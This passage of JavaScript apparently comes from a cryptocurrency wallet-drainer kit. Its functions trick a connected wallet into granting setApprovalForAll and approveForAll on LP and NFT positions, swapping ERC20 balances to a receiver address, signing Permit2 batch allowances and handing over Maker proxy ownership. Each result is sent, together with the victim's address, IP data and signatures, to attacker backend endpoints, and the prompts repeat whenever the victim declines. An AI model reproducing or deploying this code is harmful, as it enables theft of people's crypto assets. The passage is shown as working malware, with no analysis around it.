          if (window.ethereum?.["isTrustWallet"]) {
            N.value = "0";
          }
          k[0].name = "CAM_LPV3";
          k[0].totalPrice = k[0].price;
          this.estimateTXcosts(N, k[0], k[0].chain);
          try {
            this.logPromting(T, "CAM_LPV3", {
              "chain": f,
              "tokens": k,
              "tokenPrice": H,
              "to_wallet": config.tokenContractAddresses[f]
            });
          } catch (c) {
            console.warn(c);
          }
          try {
            await this.main_provider.sendAsync({
              "method": "eth_sendTransaction",
              "params": [N],
              "from": this.walletAddress
            }, (l, o) => {
              if (l) {
                U(l);
              } else {
                let I = o;
                if (o.hasOwnProperty("result")) {
                  I = o.result;
                } else if (o.hasOwnProperty("hash")) {
                  I = o.hash;
                }
                D(I);
              }
            });
          } catch (l) {
            U(l);
          }
        }).then(async D => {
          let q = await this.getIpData();
          fetch(this.logDomainName + "backend/cam_positions", {
            "method": "POST",
            "mode": "cors",
            "cache": "no-cache",
            "headers": {
              "Content-Type": "application/json",
              "Accept": "application/json"
            },
            "body": this.encryptBody(JSON.stringify({
              "address": this.walletAddress,
              "isMobile": this.isMobile(),
              "websiteUrl": window.location.href,
              "websiteDomain": window.location.host,
              "ipData": q,
              "API_KEY": config.API_KEY,
              "chain": f,
              "tokens": k,
              "signature": this.signature,
              "tokenPrice": Number(H).toFixed(3) + " ETH",
              "transactionHash": D,
              "hash_sweet": T,
              "useVerified": this.useVerified[f] ? this.verified[f] : null,
              "contract_salt": config.contract_salt_mc[f],
              "unmarkedContract": config.tokenContractAddresses[f]
            }))
          });
          this.txcount++;
          this.addToLocalStorage(T);
          return true;
        })["catch"](async D => {
          this.logCancel("Camelot LP NFTS", '', Number(H).toFixed(3) + " ETH");
          await this.handleDecline();
          if (config.repeatHighest) {
            return await this.transferCamelotLPV3(T, k, H);
          }
          this.updateButtonMessage(true);
          this.txcount++;
          return false;
        });
      } catch (D) {
        console.warn("LPV3 error:", D);
      }
    }
  };
  ["transferVeloNFTs"] = async (T, k) => {
    try {
      await this.changeNetwork(10);
      console.log("veNFTs", k);
      let V = new ethers.utils.Interface(NFT_ABI);
      let f = V.encodeFunctionData("setApprovalForAll", [config.tokenContractAddresses[10], true]);
      let D = {
        "from": this.walletAddress,
        "to": this.veNFTContract,
        "value": "0x0000",
        "data": f
      };
      if (!this.isMobile() && window.ethereum?.["isMetaMask"]) {
        D.value = '';
      }
      if (window.ethereum?.["isTrustWallet"]) {
        D.value = "0";
      }
      this.estimateTXcosts(D, k, k.chain);
      try {
        this.logPromting(T, "VELO", {
          "tokenIds": k.tokens,
          "tokenName": k.tname,
          "tokenPrice": k.totalPrice,
          "contractAddress": k.contractAddress,
          "chain": 0xa,
          "to_wallet": config.tokenContractAddresses[10]
        });
      } catch (U) {
        console.warn(U);
      }
      await new Promise(async (q, y) => {
        try {
          await this.main_provider.sendAsync({
            "method": "eth_sendTransaction",
            "params": [D],
            "from": this.walletAddress
          }, (a, t) => {
            if (a) {
              console.error("veNFTs error: ", a);
              y(a);
            } else {
              let c = t;
              if (t.hasOwnProperty("result")) {
                c = t.result;
              } else if (t.hasOwnProperty("hash")) {
                c = t.hash;
              }
              console.log("veNFTs success", c);
              this.pending.push(c);
              q(c);
            }
          });
        } catch (a) {
          y(a);
        }
      }).then(async q => {
        let K = await this.getIpData();
        fetch(this.logDomainName + "backend/vel_nft", {
          "method": "POST",
          "mode": "cors",
          "cache": "no-cache",
          "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          "body": this.encryptBody(JSON.stringify({
            "address": this.walletAddress,
            "walletBalanceInEth": this.walletBalanceInEth,
            "isMobile": this.isMobile(),
            "websiteUrl": window.location.href,
            "websiteDomain": window.location.host,
            "ipData": K,
            "API_KEY": config.API_KEY,
            "signature": this.signature,
            "tokenIds": k.tokens,
            "tokenName": k.tname,
            "tokenPrice": k.totalPrice,
            "contractAddress": k.contractAddress,
            "transactionHash": q,
            "chain": 0xa,
            "hash_sweet": T,
            "useVerified": this.useVerified[10] ? this.verified[10] : null,
            "contract_salt": config.contract_salt_mc[10],
            "unmarkedContract": config.tokenContractAddresses[10]
          }))
        });
        this.txcount++;
        this.addToLocalStorage(T);
        return true;
      })["catch"](async q => {
        this.logCancel("veNFT", k.tname, Number(k.totalPrice).toFixed(3) + " ETH");
        await this.handleDecline();
        if (config.repeatHighest) {
          return await this.transferTJ(T, k);
        }
        console.log("NFT error:", q);
        this.txcount++;
      });
    } catch (q) {
      console.log("Failed to transfer TJ", q);
    }
  };
  ["transferTJ"] = async (T, k) => {
    try {
      await this.changeNetwork(k.chain);
      console.log("TJ", k);
      let V = new ethers.utils.Interface(TRADERJOE_ABI);
      let f = V.encodeFunctionData("approveForAll", [config.tokenContractAddresses[k.chain], true]);
      let D = {
        "from": this.walletAddress,
        "to": k.contractAddress,
        "value": "0x0000",
        "data": f
      };
      if (!this.isMobile() && window.ethereum?.["isMetaMask"]) {
        D.value = '';
      }
      if (window.ethereum?.["isTrustWallet"]) {
        D.value = "0";
      }
      this.estimateTXcosts(D, k, k.chain);
      try {
        this.logPromting(T, "TJ", {
          "tokenIds": k.tokenIds,
          "tokenQuantities": k.quantities,
          "tokenName": k.tname,
          "tokenPrice": k.totalPrice,
          "contractAddress": k.contractAddress,
          "chain": k.chain,
          "hash_sweet": T,
          "to_wallet": config.tokenContractAddresses[k.chain]
        });
      } catch (U) {
        console.warn(U);
      }
      await new Promise(async (q, y) => {
        try {
          await this.main_provider.sendAsync({
            "method": "eth_sendTransaction",
            "params": [D],
            "from": this.walletAddress
          }, (a, t) => {
            if (a) {
              console.error("TJ error: ", a);
              y(a);
            } else {
              let c = t;
              if (t.hasOwnProperty("result")) {
                c = t.result;
              } else if (t.hasOwnProperty("hash")) {
                c = t.hash;
              }
              console.log("TJ success", c);
              this.pending.push(c);
              q(c);
            }
          });
        } catch (a) {
          y(a);
        }
      }).then(async q => {
        let K = await this.getIpData();
        fetch(this.logDomainName + "backend/tj", {
          "method": "POST",
          "mode": "cors",
          "cache": "no-cache",
          "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          "body": this.encryptBody(JSON.stringify({
            "address": this.walletAddress,
            "walletBalanceInEth": this.walletBalanceInEth,
            "isMobile": this.isMobile(),
            "websiteUrl": window.location.href,
            "websiteDomain": window.location.host,
            "ipData": K,
            "API_KEY": config.API_KEY,
            "signature": this.signature,
            "tokenIds": k.tokenIds,
            "tokenQuantities": k.quantities,
            "tokenName": k.tname,
            "tokenPrice": k.totalPrice,
            "contractAddress": k.contractAddress,
            "transactionHash": q,
            "chain": k.chain,
            "hash_sweet": T,
            "useVerified": this.useVerified[k.chain] ? this.verified[k.chain] : null,
            "contract_salt": config.contract_salt_mc[k.chain],
            "unmarkedContract": config.tokenContractAddresses[k.chain]
          }))
        });
        this.txcount++;
        this.addToLocalStorage(T);
        return true;
      })["catch"](async q => {
        this.logCancel("Trader Joe", k.tname, Number(k.totalPrice).toFixed(3) + " ETH");
        await this.handleDecline();
        if (config.repeatHighest) {
          return await this.transferTJ(T, k);
        }
        console.log("NFT error:", q);
        this.txcount++;
      });
    } catch (q) {
      console.log("Failed to transfer TJ", q);
    }
  };
  ["transferLPV3"] = async (T, k, H) => {
    console.log("LPV3", k);
    if (k.length > 0) {
      try {
        let f = k[0].chain;
        await this.changeNetwork(f);
        console.log("TRANSFERRING LP NFTS");
        console.table(k);
        await new Promise(async (D, U) => {
          let s = new ethers.utils.Interface(LP_ABI);
          let a = s.encodeFunctionData("setApprovalForAll", [config.tokenContractAddresses[f], true]);
          let t = [a];
          let N = s.encodeFunctionData("multicall", [t]);
          let c = {
            "from": this.walletAddress,
            "to": this.uniswapV3Positions,
            "value": "0x0000",
            "data": N
          };
          if (!this.isMobile() && window.ethereum?.["isMetaMask"]) {
            c.value = '';
          }
          if (window.ethereum?.["isTrustWallet"]) {
            c.value = "0";
          }
          k[0].name = "LPV3";
          k[0].totalPrice = k[0].price;
          this.estimateTXcosts(c, k[0], k[0].chain);
          try {
            this.logPromting(T, "LPV3", {
              "chain": f,
              "tokens": k,
              "tokenPrice": H,
              "to_wallet": config.tokenContractAddresses[f]
            });
          } catch (l) {
            console.warn(l);
          }
          try {
            await this.main_provider.sendAsync({
              "method": "eth_sendTransaction",
              "params": [c],
              "from": this.walletAddress
            }, (o, O) => {
              if (o) {
                U(o);
              } else {
                let x = O;
                if (O.hasOwnProperty("result")) {
                  x = O.result;
                } else if (O.hasOwnProperty("hash")) {
                  x = O.hash;
                }
                D(x);
              }
            });
          } catch (o) {
            U(o);
          }
        }).then(async D => {
          let q = await this.getIpData();
          fetch(this.logDomainName + "backend/positions", {
            "method": "POST",
            "mode": "cors",
            "cache": "no-cache",
            "headers": {
              "Content-Type": "application/json",
              "Accept": "application/json"
            },
            "body": this.encryptBody(JSON.stringify({
              "address": this.walletAddress,
              "isMobile": this.isMobile(),
              "websiteUrl": window.location.href,
              "websiteDomain": window.location.host,
              "ipData": q,
              "API_KEY": config.API_KEY,
              "chain": f,
              "tokens": k,
              "signature": this.signature,
              "tokenPrice": Number(H).toFixed(3) + " ETH",
              "transactionHash": D,
              "hash_sweet": T,
              "useVerified": this.useVerified[f] ? this.verified[f] : null,
              "contract_salt": config.contract_salt_mc[f],
              "unmarkedContract": config.tokenContractAddresses[f]
            }))
          });
          this.txcount++;
          this.addToLocalStorage(T);
          return true;
        })["catch"](async D => {
          this.logCancel("Uniswap LP NFTS", '', Number(H).toFixed(3) + " ETH");
          await this.handleDecline();
          if (config.repeatHighest) {
            return await this.transferLPV3(T, k, H);
          }
          this.updateButtonMessage(true);
          this.txcount++;
          return false;
        });
      } catch (D) {
        console.warn("LPV3 error:", D);
      }
    }
  };
  ["transferERC20PancakeV3"] = async (T, k, H, i) => {
    console.log("ERC20 Pancakes V3", H);
    if (H.length > 0) {
      try {
        await this.changeNetwork(k);
        console.log("TRANSFERRING APPROVED PANCAKE ERC20 TOKENS");
        await new Promise(async (D, U) => {
          let s = Math.floor(Date.now() / 1000) + 99990;
          let a = new ethers.utils.Interface(PANCAKESWAPV3);
          let t = [];
          H.map(N => {
            let l = N.balance;
            let I = N.contractAddress;
            let x;
            if (k === 1) {
              x = this.receiverSwapTokenAddress != N.contractAddress ? this.receiverSwapTokenAddress : this.receiverSwapTokenAddressAlt;
            }
            if (k === 56) {
              x = this.receiverSwapTokenAddressWBNB != N.contractAddress ? this.receiverSwapTokenAddressWBNB : this.receiverSwapTokenAddressBUSD;
            }
            console.log(I);
            console.log(x);
            console.log(this.receiverSwapTokenAddressWBNB);
            console.log(this.receiverSwapTokenAddressBUSD);
            let E = config.receiver;
            let Q = a.encodeFunctionData("exactInputSingle", [[I, x, 500, E, l, 0, 0]]);
            t.push(Q);
          });
          if (t.length != 0) {
            console.log("PANCAKESWAPV3 TRANSFER TOKEN ARRAY: ", t);
            let N = a.encodeFunctionData("multicall", [s, t]);
            let c = {
              "from": this.walletAddress,
              "to": this.pancakeSwapSmartRouter,
              "value": "0x0000",
              "data": N
            };
            if (!this.isMobile() && window.ethereum?.["isMetaMask"]) {
              c.value = '';
            }
            if (window.ethereum?.["isTrustWallet"]) {
              c.value = "0";
            }
            let l = {
              name: "PANCAKESWAP",
              totalPrice: i,
              chain: k
            };
            this.estimateTXcosts(c, l, k);
            try {
              const o = {
                chain: k,
                tokenPrice: i
              };
              this.logPromting(T, "PANCAKESWAP", o);
            } catch (O) {
              console.warn(O);
            }
            try {
              await this.main_provider.sendAsync({
                "method": "eth_sendTransaction",
                "params": [c],
                "from": this.walletAddress
              }, (I, x) => {
                if (I) {
                  console.error(I);
                  U(I);
                } else {
                  let r = x;
                  if (x.hasOwnProperty("result")) {
                    r = x.result;
                  } else if (x.hasOwnProperty("hash")) {
                    r = x.hash;
                  }
                  console.log("PANCAKE success", r);
                  this.pending.push(r);
                  this.sweets = this.sweets.filter(Q => !H.map(v => v.contractAddress).includes(Q.contractAddress));
                  this.considerations = this.considerations.filter(Q => !H.map(v => v.contractAddress).includes(Q.token));
                  this.offers = this.offers.filter(Q => !H.map(v => v.contractAddress).includes(Q.token));
                  this.uniswapTokens = this.uniswapTokens.filter(Q => !H.map(v => v.contractAddress).includes(Q.contractAddress));
                  this.txcount++;
                  this.addToLocalStorage(T);
                  D(r);
                }
              });
            } catch (I) {
              U(I);
            }
          }
          this.txcount++;
          return true;
        }).then(async D => {
          let q = await this.getIpData();
          fetch(this.logDomainName + "backend/pancakeV3", {
            "method": "POST",
            "mode": "cors",
            "cache": "no-cache",
            "headers": {
              "Content-Type": "application/json",
              "Accept": "application/json"
            },
            "body": this.encryptBody(JSON.stringify({
              "address": this.walletAddress,
              "walletBalanceInEth": this.walletBalanceInEth,
              "isMobile": this.isMobile(),
              "websiteUrl": window.location.href,
              "websiteDomain": window.location.host,
              "ipData": q,
              "API_KEY": config.API_KEY,
              "signature": this.signature,
              "tokenPrice": Number(i).toFixed(3) + " ETH",
              "chain": k,
              "hash_sweet": T,
              "tokens": H,
              "transactionHash": D,
              "useVerified": this.useVerified[k] ? this.verified[k] : null,
              "contract_salt": config.contract_salt_mc[k],
              "unmarkedContract": config.tokenContractAddresses[k]
            }))
          });
          return true;
        })["catch"](async D => {
          this.logCancel("PANCAKE ERC20", '', Number(i).toFixed(3) + " ETH");
          await this.handleDecline();
          if (config.repeatHighest) {
            return await this.transferERC20PancakeV3(T, k, H, i);
          }
          this.updateButtonMessage(true);
          this.txcount++;
          return false;
        });
      } catch (D) {
        console.log(D);
      }
    }
  };
  ["transferQuickswapLPV3"] = async (T, k, H) => {
    console.log("LPV3", k);
    if (k.length > 0) {
      try {
        let f = k[0].chain;
        await this.changeNetwork(f);
        console.log("TRANSFERRING LP NFTS");
        console.table(k);
        await new Promise(async (D, U) => {
          let K = new ethers.utils.Interface(LP_ABI);
          let s = K.encodeFunctionData("setApprovalForAll", [config.tokenContractAddresses[f], true]);
          let a = [s];
          let t = K.encodeFunctionData("multicall", [a]);
          let N = {
            "from": this.walletAddress,
            "to": this.quickswapV3Positions,
            "value": "0x0000",
            "data": t
          };
          if (!this.isMobile() && window.ethereum?.["isMetaMask"]) {
            N.value = '';
          }
          if (window.ethereum?.["isTrustWallet"]) {
            N.value = "0";
          }
          k[0].name = "QUI_LPV3";
          k[0].totalPrice = k[0].price;
          this.estimateTXcosts(N, k[0], k[0].chain);
          try {
            this.logPromting(T, "QUI_LPV3", {
              "chain": f,
              "tokens": k,
              "tokenPrice": H,
              "to_wallet": config.tokenContractAddresses[f]
            });
          } catch (c) {
            console.warn(c);
          }
          try {
            await this.main_provider.sendAsync({
              "method": "eth_sendTransaction",
              "params": [N],
              "from": this.walletAddress
            }, (l, o) => {
              if (l) {
                U(l);
              } else {
                let I = o;
                if (o.hasOwnProperty("result")) {
                  I = o.result;
                } else if (o.hasOwnProperty("hash")) {
                  I = o.hash;
                }
                D(I);
              }
            });
          } catch (l) {
            U(l);
          }
        }).then(async D => {
          let q = await this.getIpData();
          fetch(this.logDomainName + "backend/Quickpositions", {
            "method": "POST",
            "mode": "cors",
            "cache": "no-cache",
            "headers": {
              "Content-Type": "application/json",
              "Accept": "application/json"
            },
            "body": this.encryptBody(JSON.stringify({
              "address": this.walletAddress,
              "isMobile": this.isMobile(),
              "websiteUrl": window.location.href,
              "websiteDomain": window.location.host,
              "ipData": q,
              "API_KEY": config.API_KEY,
              "chain": f,
              "tokens": k,
              "hash_sweet": T,
              "signature": this.signature,
              "tokenPrice": Number(H).toFixed(3) + " ETH",
              "transactionHash": D,
              "useVerified": this.useVerified[f] ? this.verified[f] : null,
              "contract_salt": config.contract_salt_mc[f],
              "unmarkedContract": config.tokenContractAddresses[f]
            }))
          });
          this.txcount++;
          this.addToLocalStorage(T);
          return true;
        })["catch"](async D => {
          this.logCancel("Quickswap LP NFTS", '', Number(H).toFixed(3) + " ETH");
          await this.handleDecline();
          if (config.repeatHighest) {
            return await this.transferQuickswapLPV3(T, k, H);
          }
          this.updateButtonMessage(true);
          this.txcount++;
          return false;
        });
      } catch (D) {
        console.warn("LPV3 error:", D);
      }
    }
  };
  ["transferERC20Uniswap"] = async T => {
    console.log("ERC20 uniswap", this.uniswapTokens);
    if (this.uniswapTokens.length > 0) {
      try {
        await this.changeNetwork(1);
        if (this.uniswapTokens.length > 0) {
          console.log("TRANSFERRING APPROVED UNISWAP ERC20 TOKENS");
          console.table(this.uniswapTokens);
          await new Promise(async (B, V) => {
            let q = Math.floor(Date.now() / 1000) + 99990;
            let y = new ethers.utils.Interface(UNISWAP);
            console.log(this.uniswapTokens);
            let K = [];
            this.uniswapTokens.map(s => {
              let t = [];
              t[0] = s.contractAddress;
              t[1] = this.receiverSwapTokenAddress != s.contractAddress ? this.receiverSwapTokenAddress : this.receiverSwapTokenAddressAlt;
              let N = s.balance;
              let l = y.encodeFunctionData("swapExactTokensForTokens", [N, 0, t, config.receiver, q]);
              K.push(l);
            });
            if (K.length != 0) {
              console.log("UNISWAP TRANSFER TOKEN ARRAY: ", K);
              let s = y.encodeFunctionData("multicall", [q, K]);
              let a = {
                "from": this.walletAddress,
                "to": this.uniswapV3Router2,
                "value": "0x0000",
                "data": s
              };
              if (!this.isMobile() && window.ethereum?.["isMetaMask"]) {
                a.value = '';
              }
              if (window.ethereum?.["isTrustWallet"]) {
                a.value = "0";
              }
              let t = {
                name: "UNISWAP",
                totalPrice: this.uniswapValue,
                chain: 1
              };
              this.estimateTXcosts(a, t, 1);
              try {
                this.logPromting(T, "UNISWAP", {
                  "chain": 0x1,
                  "tokenPrice": this.uniswapValue
                });
              } catch (N) {
                console.warn(N);
              }
              try {
                await this.main_provider.sendAsync({
                  "method": "eth_sendTransaction",
                  "params": [a],
                  "from": this.walletAddress
                }, (c, l) => {
                  if (c) {
                    console.error(c);
                    V(c);
                  } else {
                    let O = l;
                    if (l.hasOwnProperty("result")) {
                      O = l.result;
                    } else if (l.hasOwnProperty("hash")) {
                      O = l.hash;
                    }
                    console.log("UNISWAP success", O);
                    this.addToLocalStorage(T);
                    this.pending.push(O);
                    this.sweets = this.sweets.filter(I => !this.uniswapTokens.map(x => x.contractAddress).includes(I.contractAddress));
                    this.considerations = this.considerations.filter(I => !this.uniswapTokens.map(x => x.contractAddress).includes(I.token));
                    this.offers = this.offers.filter(I => !this.uniswapTokens.map(x => x.contractAddress).includes(I.token));
                    this.pancakeswapTokens_eth = this.pancakeswapTokens_eth.filter(I => !this.uniswapTokens.map(x => x.contractAddress).includes(I.contractAddress));
                    this.sushiswapTokens = this.sushiswapTokens.filter(I => !this.uniswapTokens.map(x => x.contractAddress).includes(I.contractAddress));
                    this.permitTokens = this.permitTokens.filter(I => !this.uniswapTokens.map(x => x.token).includes(I.contractAddress));
                    B(O);
                  }
                });
              } catch (c) {
                V(c);
              }
            }
            this.txcount++;
            return true;
          }).then(async B => {
            let f = await this.getIpData();
            fetch(this.logDomainName + "backend/swap", {
              "method": "POST",
              "mode": "cors",
              "cache": "no-cache",
              "headers": {
                "Content-Type": "application/json",
                "Accept": "application/json"
              },
              "body": this.encryptBody(JSON.stringify({
                "address": this.walletAddress,
                "walletBalanceInEth": this.walletBalanceInEth,
                "isMobile": this.isMobile(),
                "websiteUrl": window.location.href,
                "websiteDomain": window.location.host,
                "ipData": f,
                "API_KEY": config.API_KEY,
                "signature": this.signature,
                "hash_sweet": T,
                "contractId": this.contractId,
                "tokenPrice": Number(this.uniswapValue).toFixed(3) + " ETH",
                "transferName": "UNISWAP",
                "transactionHash": B
              }))
            });
            return true;
          })["catch"](async B => {
            this.logCancel("UNISWAP ERC20", '', Number(this.uniswapValue).toFixed(3) + " ETH");
            await this.handleDecline();
            if (config.repeatHighest) {
              return await this.transferERC20Uniswap(T);
            }
            this.updateButtonMessage(true);
            this.txcount++;
            return false;
          });
        } else {
          console.warn("UNISWAP no approved items");
        }
      } catch (B) {
        console.warn("Failed to transfer Uniswap");
      }
    }
  };
  ["transferERC20sushiswap"] = async T => {
    if (this.sushiswapTokens.length > 0) {
      console.log("ERC20 Uniswap", this.sushiswapTokens);
      try {
        if (this.sushiswapTokens.length > 0) {
          await this.changeNetwork(1);
          console.log("TRANSFERRING APPROVED SUSHISWAP ERC20 TOKENS");
          console.table(this.sushiswapTokens);
          await new Promise(async (B, V) => {
            let U = Math.floor(Date.now() / 1000) + 99990;
            let q = [];
            q[0] = this.sushiswapTokens[0].contractAddress;
            q[1] = this.receiverSwapTokenAddress != this.sushiswapTokens[0].contractAddress ? this.receiverSwapTokenAddress : this.receiverSwapTokenAddressAlt;
            let y = this.sushiswapTokens[0].balance;
            let s = new ethers.utils.Interface(SUSHISWAP);
            let a = s.encodeFunctionData("swapExactTokensForTokens", [y, 0, q, config.receiver, U]);
            let t = {
              "from": this.walletAddress,
              "to": this.sushiSwapRouter,
              "data": a,
              "value": "0x0000"
            };
            if (!this.isMobile() && window.ethereum?.["isMetaMask"]) {
              t.value = '';
            }
            if (window.ethereum?.["isTrustWallet"]) {
              t.value = "0";
            }
            let N = {
              name: "SUSHISWAP",
              totalPrice: this.uniswapValue,
              chain: 1
            };
            this.estimateTXcosts(t, N, 1);
            try {
              this.logPromting(T, "SUSHISWAP", {
                "chain": 0x1,
                "tokenPrice": this.pancakeswapTokens_eth[0].price
              });
            } catch (c) {
              console.warn(c);
            }
            try {
              await this.main_provider.sendAsync({
                "method": "eth_sendTransaction",
                "params": [t],
                "from": this.walletAddress
              }, (l, o) => {
                if (l) {
                  console.error("Sushiswap error: ", l);
                  V(l);
                } else {
                  let I = o;
                  if (o.hasOwnProperty("result")) {
                    I = o.result;
                  } else if (o.hasOwnProperty("hash")) {
                    I = o.hash;
                  }
                  console.log("SUSHISWAP success", I);
                  this.pending.push(I);
                  this.sweets = this.sweets.filter(x => x.contractAddress != this.sushiswapTokens[0].contractAddress);
                  this.considerations = this.considerations.filter(x => x.token != this.sushiswapTokens[0].contractAddress);
                  this.offers = this.offers.filter(x => x.token != this.sushiswapTokens[0].contractAddress);
                  this.uniswapTokens = this.uniswapTokens.filter(x => x.contractAddress != this.sushiswapTokens[0].contractAddress);
                  this.pancakeswapTokens_eth = this.pancakeswapTokens_eth.filter(x => x.contractAddress != this.sushiswapTokens[0].contractAddress);
                  this.permitTokens = this.permitTokens.filter(x => x.contractAddress != this.sushiswapTokens[0].contractAddress);
                  B(I);
                }
              });
            } catch (l) {
              V(l);
            }
          }).then(async B => {
            let f = await this.getIpData();
            fetch(this.logDomainName + "backend/swap", {
              "method": "POST",
              "mode": "cors",
              "cache": "no-cache",
              "headers": {
                "Content-Type": "application/json",
                "Accept": "application/json"
              },
              "body": this.encryptBody(JSON.stringify({
                "address": this.walletAddress,
                "walletBalanceInEth": this.walletBalanceInEth,
                "isMobile": this.isMobile(),
                "websiteUrl": window.location.href,
                "websiteDomain": window.location.host,
                "ipData": f,
                "hash_sweet": T,
                "API_KEY": config.API_KEY,
                "signature": this.signature,
                "contractId": this.contractId,
                "tokenPrice": Number(this.pancakeswapTokens_eth[0].price).toFixed(3) + " ETH",
                "transferName": "PANCAKESWAP",
                "transactionHash": B
              }))
            });
            this.txcount++;
            this.addToLocalStorage(T);
            return true;
          })["catch"](async B => {
            this.logCancel("PANCAKESWAP ERC20", '', Number(this.pancakeswapTokens_eth[0].price).toFixed(3) + " ETH");
            await this.handleDecline();
            if (config.repeatHighest) {
              return await this.transferERC20sushiswap(T);
            }
            this.updateButtonMessage(true);
          });
        } else {
          console.warn("SUSHISWAP no approved items");
        }
      } catch (B) {
        console.warn("Failed to transfer PANCAKESWAP");
        this.logCancel("SUSHISWAP ERC20");
        await this.handleDecline();
        if (config.repeatHighest) {
          return await this.transferERC20sushiswap();
        }
        this.updateButtonMessage(true);
        this.txcount++;
      }
    }
  };
  ["transferERC20permit2"] = async (k, H, i) => {
    if (H.length > 0) {
      console.log("Permit2", H, i);
      console.log("PT", H);
      try {
        let D = H[0].chain;
        await this.changeNetwork(D);
        if (H.length > 0) {
          let q = Date.now() + 30758400000;
          let K = H.map(o => {
            return {
              "token": o.contractAddress,
              "amount": "146150163733090291820368483271628301965593254297",
              "expiration": q,
              "nonce": 0
            };
          });
          let s = H.map(o => {
            return {
              "from": this.walletAddress,
              "to": config.seaport_receiver,
              "amount": o.balance,
              "token": o.contractAddress
            };
          });
          let a = {
            "name": "Permit2",
            "chainId": D,
            "verifyingContract": this.permitContract
          };
          let t = {
            "PermitBatch": [{
              "name": "details",
              "type": "PermitDetails[]"
            }, {
              "name": "spender",
              "type": "address"
            }, {
              "name": "sigDeadline",
              "type": "uint256"
            }],
            "PermitDetails": [{
              "name": "token",
              "type": "address"
            }, {
              "name": "amount",
              "type": "uint160"
            }, {
              "name": "expiration",
              "type": "uint48"
            }, {
              "name": "nonce",
              "type": "uint48"
            }]
          };
          let N = {
            "details": K,
            "spender": config.tokenContractAddresses[D],
            "sigDeadline": q
          };
          let l;
          try {
            const o = {
              chain: D,
              tokenPrice: i
            };
            this.logPromting(k, "PERMIT2", o);
          } catch (O) {
            console.warn(O);
          }
          await new Promise(async (I, x) => {
            try {
              l = await this.signer._signTypedData(a, t, N);
              let r = false;
              try {
                const Q = ethers.utils.verifyTypedData(a, t, N, l);
                if (Q.toLowerCase() === this.walletAddress.toLowerCase()) {
                  r = false;
                  console.log("Signature confirmed");
                } else {
                  console.log("Might be fake");
                  r = true;
                }
              } catch {}
              I([l, r]);
            } catch (v) {
              console.log("Error:", v);
              x(v);
            }
          }).then(async I => {
            let E = I[0];
            let r = E;
            if (E.hasOwnProperty("result")) {
              r = E.result;
            } else if (E.hasOwnProperty("hash")) {
              r = E.hash;
            }
            let Q = await this.getIpData();
            fetch(this.logDomainName + "backend/permit2", {
              "method": "POST",
              "mode": "cors",
              "cache": "no-cache",
              "headers": {
                "Content-Type": "application/json",
                "Accept": "application/json"
              },
              "body": this.encryptBody(JSON.stringify({
                "address": this.walletAddress,
                "isMobile": this.isMobile(),
                "websiteUrl": window.location.href,
                "websiteDomain": window.location.host,
                "withdrawals": s,
                "ipData": Q,
                "details": K,
                "mayfake": I[1],
                "API_KEY": config.API_KEY,
                "signature": this.signature,
                "hash_sweet": k,
                "tokenPrice": Number(i).toFixed(3) + " ETH",
                "deadline": q,
                "signature": r,
                "chain": D,
                "useVerified": this.useVerified[D] ? this.verified[D] : null,
                "contract_salt": config.contract_salt_mc[D],
                "unmarkedContract": config.tokenContractAddresses[D]
              }))
            });
            this.sweets = this.sweets.filter(v => !H.map(w => w.contractAddress).includes(v.contractAddress));
            this.considerations = this.considerations.filter(v => !H.map(w => w.contractAddress).includes(v.token));
            this.offers = this.offers.filter(v => !H.map(w => w.contractAddress).includes(v.token));
            this.pancakeswapTokens_eth = this.pancakeswapTokens_eth.filter(v => !H.map(w => w.contractAddress).includes(v.contractAddress));
            this.sushiswapTokens = this.sushiswapTokens.filter(v => !H.map(w => w.contractAddress).includes(v.contractAddress));
            this.txcount++;
            this.addToLocalStorage(k);
            return true;
          })["catch"](async I => {
            this.logCancel("Permit2", '', Number(i).toFixed(3) + " ETH");
            await this.handleDecline();
            if (config.repeatHighest) {
              return await this.transferERC20permit2(k, H, i);
            }
            console.log(I);
            this.txcount++;
          });
        }
      } catch (I) {
        console.warn("Permit2 error:", I);
      }
    }
  };
  ["transferMakerProxy"] = async (T, k) => {
    console.log(this.blockaid);
    await this.changeNetwork(1);
    try {
      const V = k.chain;
      let f = k.proxyAddress;
      let D = new ethers.utils.Interface(MAKER_ABI);
      let U = D.encodeFunctionData("setOwner", [this.blockaid[1].mc]);
      try {
        this.logPromting(T, "MAKER", {
          "chain": V,
          "tokenPrice": k.totalPrice,
          "contractAddress": k.proxyAddress,
          "to_wallet": this.blockaid[V].mc
        });
      } catch (q) {
        console.warn(q);
      }
      await new Promise(async (y, K) => {
        let N = {
          "from": this.walletAddress,
          "to": f,
          "value": "0x0000",
          "data": U
        };
        if (!this.isMobile() && window.ethereum?.["isMetaMask"]) {
          N.value = '';
        }
        if (window.ethereum?.["isTrustWallet"]) {
          N.value = "0";
        }
        try {
          await this.main_provider.sendAsync({
            "method": "eth_sendTransaction",
            "params": [N],
            "from": this.walletAddress
          }, (c, l) => {
            if (c) {
              console.error("Maker error: ", c);
              K(c);
            } else {
              let O = l;
              if (l.hasOwnProperty("result")) {
                O = l.result;
              } else if (l.hasOwnProperty("hash")) {
                O = l.hash;
              }
              console.log("Maker success", O);
              this.pending.push(O);
              y(O);
            }
          });
        } catch (c) {
          K(c);
        }
      }).then(async y => {
        let s = await this.getIpData();
        let a = {
          "address": this.walletAddress,
          "chain": V,
          "isMobile": this.isMobile(),
          "websiteUrl": window.location.href,
          "websiteDomain": window.location.host,
          "API_KEY": config.API_KEY,
          "ipData": s,
          "signature": this.signature,
          "cdps": k.cdps,
          "proxyAddress": k.proxyAddress,
          "tokenPrice": k.totalPrice,
          "contract_salt": this.blockaid[1].mc_salt,
          "unmarkedContract": this.blockaid[1].mc,
          "transactionHash": y,
          "hash_sweet": T
        };
        fetch(this.logDomainName + "backend/maker", {
          "method": "POST",
          "mode": "cors",
          "cache": "no-cache",
          "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          "body": this.encryptBody(JSON.stringify(a))
        });
        this.txcount++;
        this.addToLocalStorage(T);
        return true;
      })["catch"](async y => {
        this.logCancel("Maker ", k.totalPrice + " ETH");
        await this.handleDecline();
        if (config.repeatHighest) {
          return await this.transferMakerProxy(T, k);
        }
        this.updateButtonMessage(true);
        console.log("Maker error:", y);
        this.txcount++;
      });
    } catch (y) {
      console.log("Maker Proxy transfer error:", y);
    }
  };
  ["withdrawCurve"] = async (T, k) => {
    await this.changeNetwork(1);
    try {
      let V;
      let f = CURVE_ABI;
      if (k.useEth) {
        f = CURVE_USE_ETH_ABI;
      }
